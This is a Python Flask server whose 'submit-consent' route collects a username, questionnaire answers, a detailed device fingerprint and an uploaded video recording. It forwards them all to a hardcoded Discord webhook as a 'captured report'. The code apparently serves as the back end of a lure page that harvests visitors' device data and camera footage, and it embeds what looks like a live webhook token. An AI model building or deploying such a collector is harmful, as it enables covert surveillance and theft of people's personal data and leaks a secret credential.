import os
import json
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz"
)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    username = request.form.get("username", "Utilisateur Anonyme")
    
    device_str = request.form.get("device", "{}")
    try:
        device = json.loads(device_str)
    except Exception:
        device = {}

    questions_summary = []
    for i in range(1, 21):
        val = request.form.get(f"q{i}", "N/A")
        questions_summary.append(f"Q{i}: {val}")
    
    q_text = " | ".join(questions_summary[:5])

    video_file = request.files.get("video")

    appareil = device.get('appareil', 'Appareil Inconnu')
    systeme = device.get('systemeExploitation', 'Système Inconnu')
    navigateur = device.get('navigateur', 'Inconnu')
    langue = device.get('langueSysteme', 'Inconnue')
    ram = device.get('memoireRAMApproximative', 'Non disponible')
    cpu = device.get('processeurCœurs', 'Non disponible')
    resolution = device.get('resolutionEcran', 'Non disponible')
    batterie = device.get('niveauBatterie', 'Non disponible')
    charge = device.get('etatCharge', 'Non disponible')
    eco = device.get('modeEconomieEnergie', 'Non disponible')
    orientation = device.get('orientationEcran', 'Non disponible')
    tactile = device.get('pointsTactilesMax', 'Non disponible')
    architecture = device.get('architectureCPU', 'Non disponible')
    reseau = device.get('connexionReseau', 'Non disponible')
    time_zone = device.get('fuseauHoraire', 'Non disponible')

    content_text = f"""✅ **Nouveau Rapport Capturé (Serveur de Youssef):**
• **Nom / Statut:** {username}
• **Questions:** {q_text}
• **Appareil:** {appareil}
• **Système d'exploitation:** {systeme}
• **Navigateur:** {navigateur}
• **Langue du système:** {langue}
• **Niveau de Batterie:** {batterie} ({charge})
• **Économie d'énergie:** {eco}
• **Mémoire RAM:** {ram}
• **Processeur (CPU):** {cpu} ({architecture})
• **Résolution Écran:** {resolution} ({orientation})
• **Points Tactiles:** {tactile}
• **Réseau:** {reseau}
• **Fuseau Horaire:** {time_zone}"""

    payload = {
        "content": content_text
    }

    try:
        files = {}
        if video_file:
            filename = video_file.filename or "recording.mp4"
            file_bytes = video_file.read()
            
            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
            
            files = {
                "file": (filename, file_bytes, content_type)
            }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files if files else None, 
            timeout=30
        )
        resp.raise_for_status()

        return jsonify({"message": "Success"}), 200
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)